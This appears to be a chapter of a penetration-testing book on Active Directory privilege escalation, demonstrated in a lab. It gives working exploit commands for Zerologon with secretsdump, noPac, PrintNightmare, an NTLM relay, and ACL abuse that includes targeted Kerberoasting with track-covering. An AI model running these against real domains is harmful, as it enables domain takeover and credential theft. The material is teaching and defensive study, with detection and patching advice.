<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer169">
<h1 class="chapter-number" id="_idParaDest-110"><a id="_idTextAnchor119"/>6</h1>
<h1 id="_idParaDest-111"><a id="_idTextAnchor120"/>Domain Privilege Escalation</h1>
<p>The probability that an attacker will need to escalate privileges in the target domain is high. We have already discussed why we will not touch upon the host privilege escalation theme. However, most concepts are universal. We check whether any privilege escalation exploits are applicable to the target environment. If there are none, the next step is to identify various misconfigured ACLs and GPOs and users with excessive group memberships that could have been unintentionally introduced by IT staff or during software installation in the Active Directory environment. We will reiterate these activities in every newly <span class="No-Break">discovered path.</span></p>
<p>This chapter starts with examples of good old point-and-click exploits. This will again emphasize the critical role patching plays in the security posture of an environment. Then, we will cover ACL misconfigurations and Group Policy abuses. The main caveat in detecting these escalation paths is that they can be hidden and not that obvious from the IT staff’s point of view. Also, there are specific security groups in Active Directory, the membership of which can lead to undesired consequences. We will go through them one by one. Last, but not least, is privilege escalation possibilities from the child to the parent domain. Privilege escalation involving Microsoft SQL Server and AD CS will be thoroughly covered in <span class="No-Break">later chapters.</span></p>
<p>In this chapter, we will cover the <span class="No-Break">following topics:</span></p>
<ul>
<li>Public <span class="No-Break">Zero2Hero exploits</span></li>
<li>How to find and abuse <span class="No-Break">ACL misconfigurations</span></li>
<li>What can be achieved by <span class="No-Break">manipulating GPO?</span></li>
<li>Built-in security groups <a id="_idIndexMarker447"/>review, <span class="No-Break">including </span><span class="No-Break"><strong class="bold">DNSAdmins</strong></span></li>
<li>Escalate from the child to the <a id="_idIndexMarker448"/>parent domain inside a forest and <strong class="bold">Privileged Access Management</strong> (<span class="No-Break"><strong class="bold">PAM</strong></span><span class="No-Break">) trust</span></li>
</ul>
<h1 id="_idParaDest-112"><a id="_idTextAnchor121"/>Technical requirements</h1>
<p>In this chapter, you will need to have access to <span class="No-Break">the following:</span></p>
<ul>
<li>VMware Workstation or Oracle VirtualBox with at least 16 GB of RAM, 8 CPU cores, and at least 55 GB of total space (more if you <span class="No-Break">take snapshots)</span></li>
<li>A Linux-based operating system is <span class="No-Break">strongly recommended</span></li>
<li>Vagrant installed with a plugin for the virtualization platform in use <span class="No-Break">and Ansible</span></li>
<li>The GOADv2 and <span class="No-Break">DetectionLab projects</span></li>
</ul>
<h1 id="_idParaDest-113"><a id="_idTextAnchor122"/>Zero2Hero exploits</h1>
<p>In this section, we will discuss <a id="_idIndexMarker449"/>available exploits that can provide a domain administrator’s level of access in a matter of minutes. In a mature environment with regular patching and vulnerability management, it is not very common to find such treasure. However, there is still a possibility, and checking will not hurt. We will start with a relatively old GoldenPAC vulnerability in Kerberos, discuss the root cause of Zerologon and exploit<a id="_idIndexMarker450"/> it, and get elevated privileges with PrintNightmare and noPAC. We will also briefly cover different types of “Potatoes” and discuss how wrong group membership assignment can lead to a complete <span class="No-Break">domain takeover.</span></p>
<h2 id="_idParaDest-114"><a id="_idTextAnchor123"/>MS14-068</h2>
<p><strong class="bold">MS14-068</strong> was a <a id="_idIndexMarker451"/>successor of <strong class="bold">MS11-013</strong>, meaning that it was a PAC validation vulnerability. The attacker was able to modify<a id="_idIndexMarker452"/> the existing TGT by adding privileged groups and the <a id="_idIndexMarker453"/>domain controller wrongly validated the tickets. This happened on the fly, so domain users’ group membership was not changed. All we need to exploit this vulnerability is a valid set of domain users’ credentials with a corresponding SID and domain controller FQDN. After the vulnerability was announced, the exploit was released <span class="No-Break">by </span><span class="No-Break"><em class="italic">bidord</em></span><span class="No-Break">[1].</span></p>
<p class="callout-heading">Note</p>
<p class="callout">This vulnerability is not introduced in the lab. A good step-by-step attack guide can be found <span class="No-Break">here: </span><a href="https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/"><span class="No-Break">https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/</span></a><span class="No-Break">.</span></p>
<p>Concisely, this is the command you need to run against an unpatched <span class="No-Break">domain controller:</span></p>
<pre class="console">
ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt; -p &lt;password&gt;</pre> <p>As a result, we can inject a TGT ticket and enjoy our <span class="No-Break">new privileges.</span></p>
<p>Attack <a id="_idIndexMarker454"/>detection for <a id="_idIndexMarker455"/>Kerberos is difficult, as usual. Exploitation can be caught by examining event ID 4624 for a user SID and account name mismatch. Also, we can check new users in domain groups with an SID ending in <strong class="source-inline">512</strong>, <strong class="source-inline">513</strong>, <strong class="source-inline">518</strong>, <strong class="source-inline">519</strong>, or <strong class="source-inline">520</strong>. The usual recommendation applies here as well: patch your infrastructure. After KB installation, we can detect failed exploitation attempts in event <span class="No-Break">ID 4769.</span></p>
<h2 id="_idParaDest-115"><a id="_idTextAnchor124"/>Zerologon (CVE-2020-1472)</h2>
<p>This vulnerability was a real <a id="_idIndexMarker456"/>disaster. The unauthenticated attacker was able to obtain domain admin<a id="_idIndexMarker457"/> privileges by compromising the domain controller. The vulnerability is in subverting Netlogon cryptography. <strong class="bold">Netlogon</strong> is a service for logon request verification, registration, authentication, and <a id="_idIndexMarker458"/>domain controller location. It uses the MS-NRPC interface as an authentication mechanism and MS-NRPC itself uses custom, insecure cryptography for Netlogon Secure Channel connection to domain controllers. The <a id="_idIndexMarker459"/>protocol vulnerability is the reuse of a static, zero-valued <strong class="bold">initialization vector</strong> (<strong class="bold">IV</strong>) in <span class="No-Break">AES-CFB8 mode.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Original research by <em class="italic">Tom Tervoort</em> from <em class="italic">Secura</em>, with a detailed explanation, is available <span class="No-Break">here: </span><a href="https://www.secura.com/uploads/whitepapers/Zerologon.pdf"><span class="No-Break">https://www.secura.com/uploads/whitepapers/Zerologon.pdf</span></a><span class="No-Break">.</span></p>
<p>There are two <a id="_idIndexMarker460"/>exploitation<a id="_idIndexMarker461"/> scenarios for Zerologon: <strong class="bold">relay</strong>[2] and <span class="No-Break"><strong class="bold">password change</strong></span><span class="No-Break">.</span></p>
<p>To understand the password change exploitation scenario, there are seven key concepts <span class="No-Break">summarized here[3].</span></p>
<p>Briefly, the <a id="_idIndexMarker462"/>exploit steps are <span class="No-Break">the following:</span></p>
<ol>
<li> Exploit cryptographic vulnerability to spoof the <span class="No-Break">client credentials.</span></li>
<li> Ignore signing <span class="No-Break">and sealing.</span></li>
<li>Spoof a call to bypass authentication with unlimited <span class="No-Break">login attempts.</span></li>
<li>Change the account’s password <span class="No-Break">to null.</span></li>
<li>Abuse null password to gain domain <span class="No-Break">admin privileges.</span></li>
<li>Restore the computer’s password to ensure that replication between domain controllers is <span class="No-Break">still working.</span></li>
</ol>
<p>Now let us try to exploit this <a id="_idIndexMarker463"/>vulnerability in our lab. We are going to scan all three domain controllers. We have a few exploits at our disposal, together with the Metasploit module (<strong class="source-inline">auxiliary/admin/dcerpc/cve_2020_1472_zerologon</strong>). I will use Impacket and the <em class="italic">VoidSec</em> exploit[4]. Also, I recommend creating a snapshot of the DC03 before exploitation. Running this exploit in production can cause disruption. If you still do so, do not forget to revert <span class="No-Break">the password:</span></p>
<pre class="console">
zerologon.py -t 192.168.56.12 -n MEEREEN
secretsdump.py -no-pass -just-dc essos.local/MEEREEN\$@192.168.56.12</pre> <p>The result of the exploitation is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer139">
<img alt="Figure 6.1 – Successful Zerologon exploitation" height="824" src="image/B18964_06_01.jpg" width="967"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.1 – Successful Zerologon exploitation</p>
<p>To avoid this<a id="_idIndexMarker464"/> unpleasant <a id="_idIndexMarker465"/>situation, install security patches on a regular basis – and critical <span class="No-Break">ones, immediately.</span></p>
<h2 id="_idParaDest-116"><a id="_idTextAnchor125"/>PrintNightmare (CVE-2021-1675 &amp; CVE-2021-34527)</h2>
<p>The name of the <a id="_idIndexMarker466"/>vulnerability can hint at which service introduced it. You guessed <a id="_idIndexMarker467"/>correctly – our good friend <a id="_idIndexMarker468"/>the <strong class="bold">Print Spooler service</strong>. There are three RPC protocols used by<a id="_idIndexMarker469"/> Spooler: <strong class="bold">MS-RPRN</strong>, <strong class="bold">MS-PAR</strong>, and<strong class="bold"> MS-PAN</strong>. We are<a id="_idIndexMarker470"/> interested in the first two <a id="_idIndexMarker471"/>protocols. In general, the vulnerability lies in the functions allowing the installation of remote drivers by users. We need SMB share to be reachable from the server to host our malicious DLL. The client creates an object with the path to the attacker’s DLL and passes it to another object that is then loaded by <strong class="source-inline">RpcAddPrinterDriverEx</strong>. Also, we need to bypass <strong class="source-inline">SeLoadDriverPrivilege</strong> verification on the server by setting some bits in <strong class="source-inline">dwFileCopyFlags</strong>. Then, DLL will be loaded and can be found here: <strong class="source-inline">C:\Windows\System32\spool\drivers\x64\3</strong>) and here (<strong class="source-inline">C:\Windows\System32\spool\drivers\x64\3\Old\{id}</strong>. There are some conditions found by <em class="italic">StanHacked</em>[5] depending on the protocol. If the target refuses remote connections, this exploit can be used for local privilege escalation, but only if the <strong class="source-inline">Point and Print</strong> policy <span class="No-Break">is enabled.</span></p>
<p>For<a id="_idIndexMarker472"/> exploitation, we can use an exploit written by <em class="italic">cube0x0</em>[6], a module in <a id="_idIndexMarker473"/>Mimikatz, or the Metasploit module. First of all, we <a id="_idIndexMarker474"/>need to check whether the Spooler service is running by <span class="No-Break">using </span><span class="No-Break"><strong class="bold">CrackMapExec</strong></span><span class="No-Break">:</span></p>
<pre class="console">
crackmapexec smb 192.168.56.10-12 -M spooler</pre> <p>The output of the CrackMapExec execution was <span class="No-Break">the following:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer140">
<img alt="Figure 6.2 – Spooler service enumeration" height="254" src="image/B18964_06_02.jpg" width="855"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.2 – Spooler service enumeration</p>
<p>Then, we can run an exploit from Metasploit against the target. This module has a pre-built check and will require standard domain user credentials for successful exploitation. They are not marked as mandatory options, but without them, the exploit failed, at least <span class="No-Break">for me:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer141">
<img alt="Figure 6.3 – Successful PrintNightmare exploitation" height="783" src="image/B18964_06_03.jpg" width="921"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.3 – Successful PrintNightmare exploitation</p>
<p>It took some time for<a id="_idIndexMarker475"/> Microsoft to issue the correct fix. The most reliable <a id="_idIndexMarker476"/>mitigation is to completely disable the Spooler service where it <span class="No-Break">is possible.</span></p>
<h2 id="_idParaDest-117"><a id="_idTextAnchor126"/>sAMAccountName Spoofing and noPac (CVE-2021-42278/CVE-2021-42287)</h2>
<p>This attack is a<a id="_idIndexMarker477"/> combination<a id="_idIndexMarker478"/> of two <a id="_idIndexMarker479"/>vulnerabilities. The first one, CVE-2021-42278 (Name Impersonation) lies in the fact that no validation process happened to <a id="_idIndexMarker480"/>ensure that the computer account has a trailing $ at the end. The second one, CVE-2021-42287 (KDC bamboozling) abuses the fact that if the computer name is not found by DC during S4U2Self ticket request, the search will happen again with $ appended to the computer name in a TGT. To exploit these vulnerabilities, we need unpatched domain controllers, a valid domain user account, and a machine account quota <span class="No-Break">above 0.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Good step-by-step research was published by <em class="italic">exploitph</em> <span class="No-Break">here: </span><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.xhtml"><span class="No-Break">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.xhtml</span></a><span class="No-Break">.</span></p>
<p>With the help of the <strong class="source-inline">CrackMapExec</strong> modules, we can find out the machine quota in the domain and check whether the domain controller is a vulnerability <span class="No-Break">to </span><span class="No-Break"><strong class="source-inline">noPac</strong></span><span class="No-Break">:</span></p>
<pre class="console">
crackmapexec ldap 192.168.56.10 -u 'jaime.lannister' -p 'cersei' -d sevenkingdoms.local -M MAQ
crackmapexec smb 192.168.56.10 -u 'jaime.lannister' -p 'cersei' -d sevenkingdoms.local -M nopac</pre> <p>The result of the execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer142">
<img alt="Figure 6.4 – MAQ and vulnerability check with CrackMapExec" height="428" src="image/B18964_06_04.jpg" width="1011"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.4 – MAQ and vulnerability check with CrackMapExec</p>
<p class="callout-heading">Note</p>
<p class="callout">Manual exploitation steps are well described in this lab <span class="No-Break">walk-through: </span><a href="https://mayfly277.github.io/posts/GOADv2-pwning-part5/#samaccountname-nopac"><span class="No-Break">https://mayfly277.github.io/posts/GOADv2-pwning-part5/#samaccountname-nopac</span></a><span class="No-Break">.</span></p>
<p>There are six <a id="_idIndexMarker481"/>steps to exploit<a id="_idIndexMarker482"/> <span class="No-Break">these vulnerabilities:</span></p>
<ol>
<li>Create a computer account with <strong class="source-inline">addcomputer.py</strong> <span class="No-Break">or </span><span class="No-Break"><strong class="source-inline">Powermad</strong></span><span class="No-Break">.</span></li>
<li>Clear the SPN attribute of the created or controlled machine account with <strong class="source-inline">Powerview</strong> <span class="No-Break">or </span><span class="No-Break"><strong class="source-inline">addspn.py</strong></span><span class="No-Break">.</span></li>
<li>Change the <strong class="source-inline">sAMAccountName</strong> attribute of the created or controlled machine account to the domain controller’s one but without <strong class="source-inline">$</strong> at <span class="No-Break">the end.</span></li>
<li>Request a TGT for this <span class="No-Break">machine account.</span></li>
<li>Revert the <strong class="source-inline">sAMAccountName</strong> attribute of the created or controlled machine account to the original one or any other value, but not the domain <span class="No-Break">controller’s name.</span></li>
<li>Request the TGS with <strong class="source-inline">S4U2self</strong> by presenting the obtained TGT and then use it for access to the <span class="No-Break">domain controller.</span></li>
</ol>
<p>We will use an automated exploiter written by <em class="italic">cube0x0</em>[7], where all these steps <span class="No-Break">are included:</span></p>
<pre class="console">
noPac.exe -domain sevenkingdoms.local -user jaime.lannister -pass cersei /dc kingslanding.sevenkingdoms.local /mAccount vinegrep /mPassword vinegrep /service cifs /ptt</pre> <p>The result is<a id="_idIndexMarker483"/> shown in the<a id="_idIndexMarker484"/> <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer143">
<img alt="Figure 6.5 – noPac successful exploitation" height="1528" src="image/B18964_06_05.jpg" width="957"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.5 – noPac successful exploitation</p>
<p>We can also<a id="_idIndexMarker485"/> exploit this vulnerability from a Linux machine, using an exploit <a id="_idIndexMarker486"/>written <span class="No-Break">in Python[8]:</span></p>
<pre class="console">
python3 sam_the_admin.py "essos.local/khal.drogo:horse" -dc-ip 192.168.56.12 -shell</pre> <p>The result of the execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer144">
<img alt="Figure 6.6 – sam-the-admin noPac exploit version at work" height="506" src="image/B18964_06_06.jpg" width="710"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.6 – sam-the-admin noPac exploit version at work</p>
<p>The best mitigation here is to install updates (<strong class="bold">KB5008102</strong>, <strong class="bold">KB5008380</strong>, and<strong class="bold"> KB5008602</strong>). In addition, we can monitor for event ID 4662, <strong class="source-inline">SAM Account Name</strong>, changed to detect possible <span class="No-Break">exploitation attempts.</span></p>
<h2 id="_idParaDest-118"><a id="_idTextAnchor127"/>RemotePotato0</h2>
<p><strong class="bold">Potato</strong> in<a id="_idIndexMarker487"/> an<a id="_idIndexMarker488"/> exploit <a id="_idIndexMarker489"/>name <a id="_idIndexMarker490"/>always <a id="_idIndexMarker491"/>has an <a id="_idIndexMarker492"/>association with impersonation <a id="_idIndexMarker493"/>and <strong class="bold">local privilege exploits</strong> (<strong class="bold">LPE</strong>) such as <strong class="bold">Hot</strong>, <strong class="bold">Lonely</strong>, <strong class="bold">Rotten</strong>, <strong class="bold">Juicy</strong>, <strong class="bold">Rogue,</strong> <strong class="bold">Sweet</strong>, <strong class="bold">God</strong>, or the <a id="_idIndexMarker494"/>newly discovered <strong class="bold">local </strong><span class="No-Break"><strong class="bold">potato flavors</strong></span><span class="No-Break">[9].</span></p>
<p class="callout-heading">Note</p>
<p class="callout">By the way, you can refer to this good blog post if you get lost regarding different <span class="No-Break">flavors: </span><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc"><span class="No-Break">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</span></a><span class="No-Break">.</span></p>
<p>The idea here is to trigger authentication of the logged-in high-privileged user and relay it to the domain controller. Successful exploitation requires initial access on the same host that the high-privileged user is logged on to. SMB and LDAP signing are <span class="No-Break">not enabled.</span></p>
<p>Exploit requirements are <span class="No-Break">the following:</span></p>
<ul>
<li>The attacker requires membership of the “Remote Desktop Management” group on <span class="No-Break">the computer</span></li>
<li>The member of the “Domain Admin” group must be interactively logged into <span class="No-Break">that machine</span></li>
</ul>
<p>In the GOADv2 lab, this vulnerability is not exploitable, however, it still works in DetectionLab. The exploit code is available here[10]. I used a domain controller and exchange server from DetectionLab. On a Kali machine, I started <strong class="source-inline">ntlmrelayx</strong> and then ran the exploit on the exchange server using a <span class="No-Break">PSRemote session:</span></p>
<pre class="console">
sudo impacket-ntlmrelayx -t ldap://192.168.56.102 --no-wcf-server --escalate-user vinegrep</pre> <p>I then ran the exploit on the <span class="No-Break">exchange server:</span></p>
<pre class="console">
RemotePotato0.exe -m 0 -r 192.168.56.100 -p 9998 -s 1</pre> <p>The result of the exploitation is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer145">
<img alt="Figure 6.7 – RemotePotato0 exploit execution" height="245" src="image/B18964_06_07.jpg" width="942"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.7 – RemotePotato0 exploit execution</p>
<p>As a result, we<a id="_idIndexMarker495"/> can see that our user was added <a id="_idIndexMarker496"/>to <strong class="source-inline">Enterprise </strong><span class="No-Break"><strong class="source-inline">Admin group</strong></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer146">
<img alt="Figure 6.8 – RemotePotato0 successful relay and shell" height="1271" src="image/B18964_06_08.jpg" width="794"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.8 – RemotePotato0 successful relay and shell</p>
<p>This vulnerability<a id="_idIndexMarker497"/> was silently fixed by Microsoft in <a id="_idIndexMarker498"/>October 2022 in a patch release. LDAP relay scenarios have gone, since NTLM authentication has the <strong class="source-inline">SIGN</strong> flag set. We can confirm it if we try to replicate the attack in the <span class="No-Break">GOADv2 lab:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer147">
<img alt="Figure 6.9 – RemotePotato0 exploit failed" height="500" src="image/B18964_06_09.jpg" width="1408"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.9 – RemotePotato0 exploit failed</p>
<p>This is also confirmed by our <span class="No-Break"><strong class="source-inline">ntlmrelayx</strong></span><span class="No-Break"> output:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer148">
<img alt="Figure 6.10 – Relay is not working, vulnerability was fixed" height="130" src="image/B18964_06_10.jpg" width="963"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.10 – Relay is not working, vulnerability was fixed</p>
<p>In the next section, we will discuss what ACL and ACE are and different ways to cook them for <span class="No-Break">malicious purposes.</span></p>
<h1 id="_idParaDest-119"><a id="_idTextAnchor128"/>ACL abuse</h1>
<p><strong class="bold">Access Control List (ACL) abuse</strong> provides<a id="_idIndexMarker499"/> the attacker with unique and almost undetectable ways to escalate privileges, perform lateral movement, and achieve <span class="No-Break">malware-less persistence.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Some of the most notable and comprehensive research on that theme was presented by <em class="italic">SpectreOps</em> (<a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf">https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf</a>). We will refer to some parts of the research here and in the <span class="No-Break">next chapter.</span></p>
<p>We will <a id="_idIndexMarker500"/>start with essential theory as an introduction. Each object in Active Directory has a security descriptor. Each object has associated lists of <strong class="bold">Access Control Entities</strong> (<strong class="bold">ACEs</strong>), which create<a id="_idIndexMarker501"/> two lists called the <strong class="bold">Discretionary Access Control List</strong> (<strong class="bold">DACL</strong>) and the <strong class="bold">System Access Control List</strong> (<strong class="bold">SACL</strong>). ACEs define<a id="_idIndexMarker502"/> which security <a id="_idIndexMarker503"/>principals have rights over the object. The SACL has great detection potential as it can be used for auditing access attempts. Object owners can modify the DACL. When we speak about domain objects, we are focusing our attention on user, group, computer, domain, and GPO objects. The last important concept to understand is inheritance. For all objects that have <strong class="source-inline">AdminCount=0</strong>, inheritance is enabled by default, meaning that if we apply ACE to OU or a container, it will be applied to all objects <span class="No-Break">inside it.</span></p>
<p>To find misconfigured ACLs in the domain, we can use various tools, such as ACLScanner from PowerView or BloodHound. These rights look promising from an offensive perspective: <strong class="source-inline">GenericAll, WriteDacl</strong>, <strong class="source-inline">GenericWrite (Self + WriteProperty)</strong>, <strong class="source-inline">WriteOwner and AllExtendedRights</strong> <strong class="source-inline">(</strong><span class="No-Break"><strong class="source-inline">DS-Replication-Get-Changes(All)</strong></span><span class="No-Break">, </span><span class="No-Break"><strong class="source-inline">User-Force-Change-Password)</strong></span><span class="No-Break">.</span></p>
<p>A comprehensive mind map for ACL abuse together with command examples can be found here[11]. We will cover them one by one to discuss <span class="No-Break">abuse possibilities:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer149">
<img alt="Figure 6.11 – ACL abuse mind map" height="1757" src="image/B18964_06_11.jpg" width="1650"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.11 – ACL abuse mind map</p>
<p>As we can see <a id="_idIndexMarker504"/>on the mind map, the most powerful right is <strong class="source-inline">GenericAll</strong>. It opens an attacker to a vast variety of abuse options. The <strong class="source-inline">ReadLAPSPassword</strong> property was covered before, in <a href="B18964_04.xhtml#_idTextAnchor061"><span class="No-Break"><em class="italic">Chapter 4</em></span></a>. The <strong class="source-inline">WriteProperty</strong> permission applied to the <strong class="source-inline">KeyCredentialLink</strong> property for the computer and user can lead to <a id="_idIndexMarker505"/>a <strong class="bold">shadow credentials attack</strong>, which will be covered in <a href="B18964_08.xhtml#_idTextAnchor163"><span class="No-Break"><em class="italic">Chapter 8</em></span></a> later, thus it’s not mentioned in the <span class="No-Break">upcoming section.</span></p>
<p>One special case that is slightly unusual is related to <strong class="source-inline">ReadGMSAPassword</strong> ACL abuse. The attacker needs to control an object that is listed in the <strong class="source-inline">msDS-GroupMSAMembership</strong> ACL of the target object. In plain words, this is the list of objects that are allowed to query the password for <span class="No-Break">the gMSA.</span></p>
<h2 id="_idParaDest-120"><a id="_idTextAnchor129"/>Group</h2>
<p>From an <a id="_idIndexMarker506"/>offensive perspective, if an attacker controls the object with one of the following ACLs (<strong class="source-inline">GenericAll</strong>, <strong class="source-inline">GenericWrite</strong>, <strong class="source-inline">Self</strong>, <strong class="source-inline">WriteProperty</strong>, or <strong class="source-inline">AllExtendedRights</strong>) on the group, then it is possible to add an object to the group. The <strong class="source-inline">WriteOwner</strong> permission allows the attacker to get ownership of the group. If <strong class="source-inline">WriteDacl</strong> is also in control, it is possible to combine both rights and grant <strong class="source-inline">GenericAll</strong> privileges to itself, effectively getting full control of the group. We will perform the scan in the <strong class="source-inline">sevenkingdoms</strong> domain to detect misconfiguration with the help <span class="No-Break">of </span><span class="No-Break"><strong class="source-inline">PowerView</strong></span><span class="No-Break">:</span></p>
<pre class="console">
Invoke-ACLScanner -Domain sevenkingdoms.local</pre> <p>The result is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer150">
<img alt="Figure 6.12 – tywin.lannister has the WriteDacl right on the Small Council group" height="233" src="image/B18964_06_12.jpg" width="787"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.12 – tywin.lannister has the WriteDacl right on the Small Council group</p>
<p>To abuse the <strong class="source-inline">WriteDacl</strong> privilege, we need to add full control over the group to <strong class="source-inline">tywin.lannister</strong> and then add him to the group. We can do it with two <span class="No-Break">PowerView commands:</span></p>
<pre class="console">
Add-DomainObjectAcl -TargetIdentity "Small Council" -PrincipalIdentity tywin.lannister -Domain sevenkingdoms.local -Rights All -Verbose
Add-DomainGroupMember -Identity "Small Council" -Members tywin.lannister -Verbose</pre> <p>The result of the<a id="_idIndexMarker507"/> preceding commands is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer151">
<img alt="Figure 6.13 – tywin.lannister added himself to the Small Council group" height="557" src="image/B18964_06_13.jpg" width="1172"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.13 – tywin.lannister added himself to the Small Council group</p>
<p>The <strong class="source-inline">WriteProperty</strong> right on the group allows the attacker to add any principal to the group, but the <strong class="source-inline">Self</strong> right<a id="_idIndexMarker508"/> allows only the object itself to be added to <span class="No-Break">the group.</span></p>
<h2 id="_idParaDest-121"><a id="_idTextAnchor130"/>Computer</h2>
<p>The most <a id="_idIndexMarker509"/>common exploitation scenario when a computer object’s specific right is under control is Kerberos <strong class="bold">resource-based constrained delegation</strong> (<strong class="bold">RBCD</strong>). To perform Kerberos RBCD, an attacker needs to control one of the following permissions: <strong class="source-inline">GenericAll</strong>, <strong class="source-inline">GenericWrite</strong>, <strong class="source-inline">Self</strong>, or <strong class="source-inline">WriteProperty</strong> on the <strong class="source-inline">ms-AllowedToActOnBehalfOfOtherIdentity</strong> property. <strong class="source-inline">WriteProperty</strong> on the <strong class="source-inline">Service-Principal-Name</strong> attribute will allow an adversary to execute an SPN-jacking<a id="_idIndexMarker510"/> attack. This scenario involves <strong class="bold">Kerberos Constrained Delegation</strong> (<strong class="bold">KCD</strong>) abuse. In brief, the idea is that the attacker compromises the server with KCD and at the same time has the <strong class="source-inline">WriteSPN </strong>(<strong class="source-inline">WriteProperty on Service-Principal-Name</strong>) right over the target server, and the one that is listed in the compromised server’s constrained delegation configuration. Then the attacker will remove SPN from the second server and add it to the target one, running the full S4U attack on the compromised server. Then, they will edit the ticket’s SPN and pass it. As an example in our lab, such a situation may look like the following. An adversary compromised the <strong class="source-inline">Castelblack</strong> server, which had KCD configured for <strong class="source-inline">Winterfell</strong>. The final target <a id="_idIndexMarker511"/>was Legit-PC, where an attacker had the <strong class="source-inline">WriteSPN</strong> r<a id="_idTextAnchor131"/>ight. Firstly, add the SPN of <strong class="source-inline">winterfell</strong> to <strong class="source-inline">Legit-PC</strong>. Next, request the ticket for the same SPN and edit the ticket’s SPN with Rubeus <strong class="source-inline">tgssub</strong> to point to the <span class="No-Break">Legit-PC service.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Original research is published at <a href="https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/">https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/</a> and a set of commands to perform SPN-jacking can be found <span class="No-Break">here: </span><a href="https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking"><span class="No-Break">https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking</span></a><span class="No-Break">.</span></p>
<h2 id="_idParaDest-122"><a id="_idTextAnchor132"/>User</h2>
<p>As mentioned <a id="_idIndexMarker512"/>at the beginning, the <strong class="source-inline">GenericAll</strong> right will grant full control over the object. All attack paths discussed here are possible because of a certain set of controlled rights. The <strong class="source-inline">GenericWrite</strong> permission allows the attacker to take over a user account by changing the password without knowing the current one. The <strong class="source-inline">WriteDacl</strong> right allows the attacker to grant themselvesfull control over the user object. <strong class="source-inline">GenericWrite</strong> or <strong class="source-inline">WriteProperty</strong> opens certain attack venues, depending on the property itself. The property can be logon script attribute (<strong class="source-inline">scriptPath</strong> or <strong class="source-inline">msTSInitialProgram</strong>), <strong class="source-inline">Service-Principal-Name</strong>, or the <strong class="source-inline">userAccountControl</strong> attribute. The last two will allow us to <a id="_idIndexMarker513"/>perform <strong class="bold">Targeted Kerberoasting</strong> and <strong class="bold">Targeted AS-REP Roasting</strong>. I used <a id="_idIndexMarker514"/>an ADSI edit and added the <strong class="source-inline">WriteProperty</strong> right to <strong class="source-inline">jaime.lannister</strong> over the <strong class="source-inline">lord.varys</strong> user object. Now, enumerate and confirm it with the help <span class="No-Break">of PowerView:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer152">
<img alt="Figure 6.14 – jaime.lannister has WriteProperty over lord.varys" height="230" src="image/B18964_06_14.jpg" width="787"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.14 – jaime.lannister has WriteProperty over lord.varys</p>
<p>Our first attack<a id="_idIndexMarker515"/> will be targeted Kerberoasting. The idea is to set the SPN on the user, obtain the Kerberoast hash, and clear out the SPN to cover our tracks. This can be achieved with the following <span class="No-Break">PowerView commands:</span></p>
<pre class="console">
Set-DomainObject -Identity 'lord.varys' -Set @{serviceprincipalname='notexist/ROAST'}
Get-DomainUser 'lord.varys' | Get-DomainSPNTicket | fl
Set-DomainObject -Identity 'lord.varys' -Clear ServicePrincipalName</pre> <p>The result of the preceding commands is shown in <span class="No-Break">the screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer153">
<img alt="Figure 6.15 – Successful targeted Kerberoasting of the lord.varys user" height="386" src="image/B18964_06_15.jpg" width="955"/>
</div>
</div>
